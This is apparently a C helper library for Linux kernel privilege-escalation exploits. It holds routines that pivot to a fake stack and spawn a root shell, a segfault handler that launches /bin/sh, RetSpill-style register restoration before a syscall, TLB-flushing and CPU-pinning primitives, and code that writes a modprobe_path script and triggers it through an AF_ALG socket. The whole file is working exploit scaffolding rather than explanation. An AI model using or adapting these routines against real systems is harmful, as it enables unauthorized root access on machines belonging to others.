#define _GNU_SOURCE

#include "general.h"
#include "io_helpers.h"
#include <fcntl.h>
#include <libgen.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>

char fake_stack[0x1000];

void shell() {
#if defined(__x86_64__)
  __asm__(".intel_syntax noprefix;"
          "mov rsp, %0;"
          "add rsp, 0x500;"
          "mov rbp, rsp;"
          "add rbp, 0x100;"
          ".att_syntax;"
          :
          : "r"(fake_stack)
          :);
#endif
  int uid = getuid();
  if (uid == 0) {
    important("success! uid : %d", uid);
    char *args[] = {"/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);
  } else {
    error("failed! uid : %d", uid);
  }
}

void crash_handler(int signum) {
  important("pwned");
  system("/bin/sh");
  exit(0);
}

void crash() {
  signal(SIGSEGV, crash_handler);
  *(char *)1 = 0;
  error("bad!!");
}

void retspill(struct syscall_regs *regs) {
#if defined(__x86_64__)
  __asm__(".intel_syntax noprefix;"
          "mov rdi, %0;"
          "mov rsi, [rdi + 0x30];"
          "push rsi;"
          "popf;"
          "mov rbp, %0;"
          "mov r15, qword ptr [rdi + 0x00];"
          "mov r14, qword ptr [rdi + 0x08];"
          "mov r13, qword ptr [rdi + 0x10];"
          "mov r12, qword ptr [rdi + 0x18];"
          "mov rbp, qword ptr [rdi + 0x20];"
          "mov rbx, qword ptr [rdi + 0x28];"
          "mov r10, qword ptr [rdi + 0x38];"
          "mov r9,  qword ptr [rdi + 0x40];"
          "mov r8,  qword ptr [rdi + 0x48];"
          "mov rax, qword ptr [rdi + 0x50];"
          "mov rdx, qword ptr [rdi + 0x60];"
          "mov rsi, qword ptr [rdi + 0x68];"
          "mov rdi, qword ptr [rdi + 0x70];"
          "syscall;"
          ".att_syntax;"
          :
          : "r"(regs)
          :);
#endif
}

void pin_cpu(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset) != 0)
    perror("pin_cpu");
}

void flush_tlb(void *addr, long len) {
  short *status;
  status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  *status = 0;
  if (fork() == 0) {
    munmap(addr, len);
    *status = 1;
    sleep(9999);
  }
  while (*status == 0)
    usleep(10 * 1000);
  munmap(status, sizeof(short));
}

int setup_modprobe(char *path, char *cmd) {
  FILE *fp = fopen(path, "w");
  if (checkw(fp != 0, "fopen"))
    return -1;
  fprintf(fp, "#!/bin/sh\n%s\n", cmd);
  fclose(fp);
  if (checkw(chmod(path, 0755) == 0, "chmod")) {
    return -1;
  }
  return 0;
}
int run_modprobe() {
  // https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch
  return socket(AF_ALG, SOCK_SEQPACKET, 0);
}
